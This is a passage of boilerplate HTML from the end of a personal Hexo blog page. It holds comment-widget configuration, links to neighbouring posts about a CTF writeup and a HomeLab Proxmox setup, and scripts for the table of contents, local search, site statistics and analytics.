        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2022-11-30T19-20-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;ä¸Šä¸€ç¯‡</div>
            <div class="card">
                <a href="/2022/12/18/Server_HomeLab_1_PVEsetup/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="HomeLab | 1 Proxmox Virtual Environment(PVE) å®‰è£…åŠé…ç½®">
                        
                        <span class="card-title">HomeLab | 1 Proxmox Virtual Environment(PVE) å®‰è£…åŠé…ç½®</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            å“ªä¸ªç”·å­©å­ä¸æƒ³æ•´ä¸ªè‡ªå·±çš„HomeLabå‘¢ï¼Ÿè¿™ä¸ªç³»åˆ—å°±æ¥è¯´ä¸€è¯´å–µå–µææœºçš„æ•…äº‹ï¼Œè¿™ç¯‡åšå®¢ä¸»è¦è®°å½•ä¸€ä¸‹PVEå®‰è£…å’Œé…ç½®çš„è¿‡ç¨‹å–µ~
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-18
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Tech/" class="post-category">
                                    Tech
                                </a>
                            
                            <a href="/categories/Tech/Server/" class="post-category">
                                    Server
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Tech/">
                        <span class="chip bg-color">Tech</span>
                    </a>
                    
                    <a href="/tags/Configuration/">
                        <span class="chip bg-color">Configuration</span>
                    </a>
                    
                    <a href="/tags/Server/">
                        <span class="chip bg-color">Server</span>
                    </a>
                    
                    <a href="/tags/HomeLab/">
                        <span class="chip bg-color">HomeLab</span>
                    </a>
                    
                    <a href="/tags/PVE/">
                        <span class="chip bg-color">PVE</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                ä¸‹ä¸€ç¯‡&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/10/31/CTF_2022Hackergame_0x03/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CTF | 2022 USTC Hackergame WriteUp 0x03">
                        
                        <span class="card-title">CTF | 2022 USTC Hackergame WriteUp 0x03</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            è¿™æ˜¯2022 Hackergameçš„wpç¬¬ä¸‰éƒ¨åˆ†ï¼Œä¸»è¦åŒ…æ‹¬ä¸€äº›éš¾åº¦ç¨å¤§çš„é¢˜ç›®ï¼Œä»¥åŠå–µå–µçš„ç¢ç¢å¿µï¼Œæ€»ä¹‹å­¦åˆ°äº†è®¸å¤šã€‚
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-31
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'æ¥æº: MiaoTony&#39;så°çª<br />'
            + 'æ–‡ç« ä½œè€…: MiaoTony<br />'
            + 'æ–‡ç« é“¾æ¥: <a href="' + url + '">' + url + '</a><br />'
            + 'æœ¬æ–‡ç« è‘—ä½œæƒå½’ä½œè€… MiaoTony æ‰€æœ‰ï¼Œä»»ä½•å½¢å¼çš„è½¬è½½éƒ½è¯·æ³¨æ˜å‡ºå¤„ã€‚';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- ä»£ç å—åŠŸèƒ½ä¾èµ– -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- ä»£ç è¯­è¨€ -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- ä»£ç å—å¤åˆ¶ -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- ä»£ç å—æ”¶ç¼© -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;ç›®å½•</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC æ‚¬æµ®æŒ‰é’®. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* ä¿®å¤æ–‡ç« å¡ç‰‡ div çš„å®½åº¦. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // åˆ‡æ¢TOCç›®å½•å±•å¼€æ”¶ç¼©çš„ç›¸å…³æ“ä½œ.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;ç«™ç‚¹æ€»å­—æ•°:&nbsp;<span
                class="white-color">452.9k</span>&nbsp;å­—
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;æ€»è®¿é—®é‡:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;æ¬¡
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;æ€»è®¿é—®äººæ•°:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;äºº
            </span>
                        <br>
                        <span id="sitetime">è½½å…¥è¿è¡Œæ—¶é—´...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffDays + " å¤© " + diffHours +
                            " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "æœ¬ç«™å·²å®‰å…¨è¿è¡Œ " + diffYears + " å¹´ " + diffDays +
                            " å¤© " + diffHours + " å°æ—¶ " + diffMinutes + " åˆ†é’Ÿ " + diffSeconds + " ç§’";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="å…³æ³¨æˆ‘çš„TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="è®¿é—®æˆ‘çš„GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="é‚®ä»¶è”ç³»æˆ‘" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS è®¢é˜…" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- æœç´¢é®ç½©æ¡† -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;æœç´¢</span>
            <input type="search" id="searchInput" name="s" placeholder="è¯·è¾“å…¥æœç´¢çš„å…³é”®å­—"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    var cnt = 1;
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var content_index = [];
                        var data_title_origin = data.title.trim();
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + String(cnt) + ". " + data_title_origin + "</a>";
                            cnt += 1;
    
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 300 characters
                                var start = first_occur - 30;
                                if (start < 0) {
                                    start = 0;
                                }
                                var match_content = content.substr(start, 300);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });
    
                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    str = "<p class=\"search-result-summary\">å…±æ‰¾åˆ° " + String(cnt-1) + " æ¡ç»“æœ</p>"  + str;
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- å›åˆ°é¡¶éƒ¨æŒ‰é’® -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.min.js"></script>

    

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
